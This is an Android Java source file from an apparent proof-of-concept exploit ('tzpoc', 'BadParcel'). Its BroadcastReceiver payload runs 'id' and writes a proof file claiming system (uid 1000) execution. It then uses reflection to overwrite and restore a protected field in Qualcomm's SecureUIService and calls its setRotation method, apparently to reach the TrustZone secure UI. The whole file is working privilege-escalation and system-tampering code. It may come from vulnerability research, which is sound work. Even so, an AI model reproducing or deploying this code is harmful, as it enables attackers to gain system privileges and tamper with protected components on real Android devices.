package com.example.tzpoc;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.Process;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public class SystemCommandReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        int uid = Process.myUid();
        String msg = "[SystemCommandReceiver] onReceive called. UID=" + uid;
        Log.i("BadParcel", msg);
        MainActivity.appendLog(msg);

        try {
            java.lang.Process process = Runtime.getRuntime().exec("id");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            int exitCode = process.waitFor();
            MainActivity.appendLog("id output:\n" + output.toString() + "exit code: " + exitCode);

            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists()) dir.mkdirs();
            File proof = new File(dir, "uid_proof.txt");
            try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
                pw.println("Executed by system (uid=1000)");
                pw.println("My UID: " + uid);
                pw.println("id command output:");
                pw.print(output.toString());
                pw.println("Timestamp: " + new java.util.Date());
            }
            MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());

            // SecureUIリフレクションを試行（システム権限）
            attemptSecureUIReflection();

        } catch (Exception e) {
            MainActivity.appendLog("[-] System command execution failed: " + e.getMessage());
        }
    }

    private void attemptSecureUIReflection() {
        MainActivity.appendLog("[*] Attempting SecureUI reflection from system context...");
        try {
            Class<?> clazz = Class.forName("com.qualcomm.qti.services.secureui.SecureUIService");
            java.lang.reflect.Field contextField = clazz.getDeclaredField("context");
            contextField.setAccessible(true);
            Object context = contextField.get(null);
            MainActivity.appendLog("[+] SecureUIService.context = " + context);

            java.lang.reflect.Field touchField = clazz.getDeclaredField("TOUCH_LIB_ADDR");
            touchField.setAccessible(true);
            byte[] orig = (byte[]) touchField.get(null);
            MainActivity.appendLog("[+] Original TOUCH_LIB_ADDR: " + bytesToHex(orig));

            byte[] newAddr = {0x00,0x00,0x00,0x00,0x00,0x00};
            touchField.set(null, newAddr);
            MainActivity.appendLog("[+] TOUCH_LIB_ADDR modified to zeros");

            java.lang.reflect.Method setRotation = clazz.getMethod("setRotation", int.class);
            setRotation.invoke(null, 16);
            MainActivity.appendLog("[+] setRotation(16) called.");

            touchField.set(null, orig);
            MainActivity.appendLog("[+] TOUCH_LIB_ADDR restored.");
        } catch (Exception e) {
            MainActivity.appendLog("[-] SecureUI reflection failed: " + e.getMessage());
        }
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02X ", b));
        return sb.toString();
    }
}
